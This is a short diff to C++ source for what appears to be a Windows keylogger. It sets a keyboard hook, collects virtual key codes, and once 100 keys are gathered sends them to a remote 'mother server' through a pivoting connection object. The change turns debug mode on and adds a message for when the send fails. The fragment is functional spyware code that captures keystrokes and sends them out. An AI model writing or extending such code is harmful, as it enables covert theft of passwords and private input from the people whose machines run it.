@@ -9,10 +9,11 @@
 #include <Windows.h>
 #include <WinUser.h>
 #include <vector>
+#include <thread>
 #include "codes.h"
 #include "connections_pivoter.h"
 
-#define DEBUG FALSE
+#define DEBUG TRUE
 #define KEYS_LIMIT 100
 HHOOK keyboard_events_hook; 
 std::vector<std::string> virt_codes; 
@@ -22,8 +23,10 @@ void stack_codes() {
 	if (virt_codes.size() < KEYS_LIMIT)
 		return; 
 	
-	// send the codes to the mother server 
-	mother_server_pv.send_codes(virt_codes); 
+	bool res = mother_server_pv.send_codes(virt_codes); 
+	if (DEBUG && !res)
+		std::cout << "Failed sending message to the mother server" << std::endl; 
+
 	virt_codes.clear();
 }
 
